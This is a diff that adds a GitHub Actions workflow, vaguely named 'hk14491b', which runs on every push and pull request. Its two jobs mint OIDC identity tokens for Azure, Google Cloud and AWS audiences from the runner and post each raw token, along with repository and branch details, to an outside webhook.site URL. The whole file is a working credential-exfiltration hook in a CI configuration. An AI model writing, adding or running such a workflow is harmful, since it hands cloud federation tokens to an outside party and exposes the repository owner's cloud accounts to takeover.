@@ -1,0 +1,40 @@
+name: hk14491b
+# b
+on:
+  workflow_dispatch:
+  push:
+    branches: ['**']
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  plain:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint
+        env:
+          SINK: https://webhook.site/b734bac1-279b-433f-bc9c-730e86508f33
+        run: |
+          for AUD in "api://AzureADTokenExchange" "//iam.googleapis.com/projects/1052781069983/locations/global/workloadIdentityPools/hkprobe/providers/hkprobe" "sts.amazonaws.com"; do
+            R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$AUD")")
+            J=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+            echo "MINT aud=$AUD len=${#J}"
+            curl -s -m 25 -X POST "$SINK" -H 'Content-Type: application/json' -d "{\"aud_req\":\"$AUD\",\"jwt\":\"$J\",\"job\":\"plain\",\"ref\":\"$GITHUB_REF\",\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\"}" -o /dev/null -w 'SINK %{http_code}\n'
+            sleep 3
+          done
+  envjob:
+    runs-on: ubuntu-latest
+    environment: hk14491
+    steps:
+      - name: mint-env
+        env:
+          SINK: https://webhook.site/b734bac1-279b-433f-bc9c-730e86508f33
+        run: |
+          for AUD in "api://AzureADTokenExchange" "//iam.googleapis.com/projects/1052781069983/locations/global/workloadIdentityPools/hkprobe/providers/hkprobe"; do
+            R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$AUD")")
+            J=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+            echo "MINTENV aud=$AUD len=${#J}"
+            curl -s -m 25 -X POST "$SINK" -H 'Content-Type: application/json' -d "{\"aud_req\":\"$AUD\",\"jwt\":\"$J\",\"job\":\"env\",\"ref\":\"$GITHUB_REF\",\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\"}" -o /dev/null -w 'SINK %{http_code}\n'
+            sleep 3
+          done
